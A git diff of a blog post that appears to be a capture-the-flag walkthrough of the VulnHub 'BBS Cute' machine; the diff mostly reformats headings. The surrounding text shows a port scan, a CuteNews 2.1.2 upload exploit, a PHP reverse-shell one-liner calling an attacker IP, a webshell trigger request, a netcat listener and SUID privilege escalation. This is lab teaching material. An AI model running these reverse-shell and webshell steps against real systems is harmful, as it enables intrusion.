@@ -3,10 +3,10 @@ layout: post
 author: H4
 ---
 
-# PG VULNHUB BBS Cute
 [Details](https://www.vulnhub.com/entry/bbs-cute-102,567/)
-## discovery
-### portscan
+
+# discovery
+## portscan
 Starting with a simple port scan to identify the attack surface.
 ```bash
 $ nmap -Pn 192.168.55.128
@@ -17,13 +17,13 @@ $ nmap -Pn 192.168.55.128
 - 110 (pop3)
 - 995 (pop3)
 
-### web application
+## web application
 Use some kind of dir busting tool like `gobuster` or `dirb` to identify the `index.php`  
 -> `cutenews 2.1.2` is installed on the target.
 
 ---
 
-## exploitation
+# exploitation
 `cutenews 2.1.2` is vulnerable to a [rce](https://www.exploit-db.com/exploits/48800) via file upload.
 
 1. register a new account
@@ -143,18 +143,18 @@ It worked!
 
 ---
 
-## post exploitation
-### get a reverse shell
+# post exploitation
+## get a reverse shell
 We are using a simple `PHP` based reverse shell here.  
 payload: ```php -r '$sock=fsockopen("192.168.49.89",443);exec("/bin/sh -i <&3 >&3 2>&3");'```
 
-#### start listener on the attacking machine
+### start listener on the attacking machine
 ```bash
 $ nc -lvp 443
 listening on [any] 443 ...
 ```
 
-#### trigger reverse shell
+### trigger reverse shell
 ```http
 GET /uploads/avatar_hacker_shell.php?cmd=php+-r+'$sock%3dfsockopen("192.168.49.55",443)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
 Host: 192.168.55.128
@@ -167,7 +167,7 @@ Cookie: CUTENEWS_SESSION=qujdjltcojbtb3glgfsc3guqum
 Connection: close
 ````
 
-#### catch connect from target
+### catch connect from target
 ```bash
 $ nc -lvp 443
 listening on [any] 443 ...
@@ -178,7 +178,7 @@ $ whoami
 www-data
 ```
 
-### get first flag
+## get first flag
 ```bash
 $ pwd
 /var/www
@@ -187,7 +187,7 @@ $ cat local.txt
 ```
 -> ```1******************************c```
 
-### privilege escalation
+## privilege escalation
 Looking for SUID binaries.
 ```bash
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -206,7 +206,7 @@ root
 
 We got root!
 
-### get second flag
+## get second flag
 ```bash
 # cd /root
 # ls
